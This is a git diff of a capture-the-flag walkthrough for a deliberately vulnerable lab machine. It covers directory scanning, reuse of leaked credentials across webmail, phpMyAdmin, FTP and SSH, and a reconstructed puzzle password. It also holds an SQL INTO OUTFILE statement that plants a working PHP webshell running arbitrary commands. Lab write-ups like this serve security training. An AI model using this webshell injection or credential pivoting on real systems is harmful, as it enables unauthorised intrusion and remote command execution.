@@ -20,45 +20,103 @@ dirb https://10.13.100.x
 
 we find a /forum + other directories we will get to later
 after scanning the posts in the forum, we find a thread from lmezard where there is a bunch of logs and errors, after a quick scan we can find a leaked pw : **!q\]Ej?\*5K5cy\*AJ**
-we log in with lmezard:!q\]Ej?*5K5cy*AJ and we find her email we go to https://192.168.188.140/webmail/ we use the same pw
-we will find identifiers to the database phpmyadmin root/Fg-'kKXBj87E:aJ$
-we can inject a webshell using sql, but we'll need to find the directory where to put it, all directories will return an error except https://192.168.188.140/forum/templates_c/
+we log in with lmezard:!q\]Ej?\*5K5cy\*AJ and we don't find anything that's interesting.
+Our last command with dirb found a https:://10.13.100.x/webmail/ , now let's go back to the forum and get lmezard email then log with it using the same passowrd.
+we will find identifiers to the database phpmyadmin **root/Fg-'kKXBj87E:aJ$**
+https:://10.13.100.x/phpmyadmin/ was also a directory found, let's log into it using those credentials:
+Let's try injecting a simple PHP webshell using sql:
+```sql
+SELECT "<HTML><BODY><FORM METHOD="GET" NAME="myform" ACTION=""><INPUT TYPE="text" NAME="cmd"><INPUT TYPE="submit" VALUE="Send"></FORM><pre><?php if($_GET['cmd']) {​​system($_GET['cmd']);}​​ ?> </pre></BODY></HTML>"
+
+INTO OUTFILE '/var/www/html/forum/templates_c/cmd.php'
+```
+After some trial and error, all directories found with dirb are non-writable and will return an error except https://10.13.100.x/forum/templates_c/
+
+Cool, now we can access the webshell https://10.13.100.x/forum/templates_c/cmd.php and try simple commands.
+
 now if we see what's inside /home we'll see a file called LOOKATME that contains : **lmezard:G!@M6f4Eatau{sF"**
-this isn't working in ssh but first when we ran nmap we saw a port 21 open for ftp.
-ftp 192.168.188.140
+this isn't working in ssh but first when we ran Nmap we saw a port 21 open for ftp. We can connect to it from our machine.
+```console
+ftp 10.13.100.x
 Name > lmezard
 Password > G!@M6f4Eatau{sF"
-
+```
 we got in, let's try ls command, it doesn't work let's try passive mode
+```console
 ftp > pass
 ftp > ls
 150 Here comes the directory listing.
 -rwxr-x--- 1 1001 1001 96 Oct 15 2015 README
 -rwxr-x--- 1 1001 1001 808960 Oct 08 2015 fun
 226 Directory send OK.
+```
 
 we use mget to get the files to our working directory
+```
 mget README fun
+```
 
-t r e h I? a?
+```
+cat README
+Complete this little challenge and use the result as password for user 'laurie' to login in ssh
+```
 
-01 I
-02 h
-03 e
-04 a
-05 r
-06 t
-07 p
-08 w
-09 n
-10 a
-11 g
-12 e
+When we inspect the "fun" file, It's a c program with a bunch of comments and printfs of "Hahahaha Got you!!!\n", this is the main function:
+```c
+int main() {
+	printf("M");
+	printf("Y");
+	printf(" ");
+	printf("P");
+	printf("A");
+	printf("S");
+	printf("S");
+	printf("W");
+	printf("O");
+	printf("R");
+	printf("D");
+	printf(" ");
+	printf("I");
+	printf("S");
+	printf(":");
+	printf(" ");
+	printf("%c",getme1());
+	printf("%c",getme2());
+	printf("%c",getme3());
+	printf("%c",getme4());
+	printf("%c",getme5());
+	printf("%c",getme6());
+	printf("%c",getme7());
+	printf("%c",getme8());
+	printf("%c",getme9());
+	printf("%c",getme10());
+	printf("%c",getme11());
+	printf("%c",getme12());
+	printf("\n");
+	printf("Now SHA-256 it and submit");
+}
+```
+
+if we try looking for getme() functions we will only find from getme8() to getme12(), the others are missing, now we the end of password and that is:
+
+01 02 03 04 05 06 07 08 09 10 11 12
+?  ?  ?  ?  ?  ?  ?  w  n  a  g  e
+
+now if we search for "return" we will find some commented returns those are the 7 characters left: h p e a I r t
+
+If we assume the I is the first letter since it's uppercase + the last word will most likely be pwnage we will be left with the characters: h e a r t
+
+01 02 03 04 05 06 07 08 09 10 11 12
+I  h  e  a  r  t  p  w  n  a  g  e
+
+let's trying hashing the following password and let's try ssh to laurie;
 
 sha256(Iheartpwnage) = 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
 
 ssh laurie@192.168.188.140
 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+
+IT WORKED!!
 
 bomb:<br/>
 1)Public speaking is very easy.<br/>
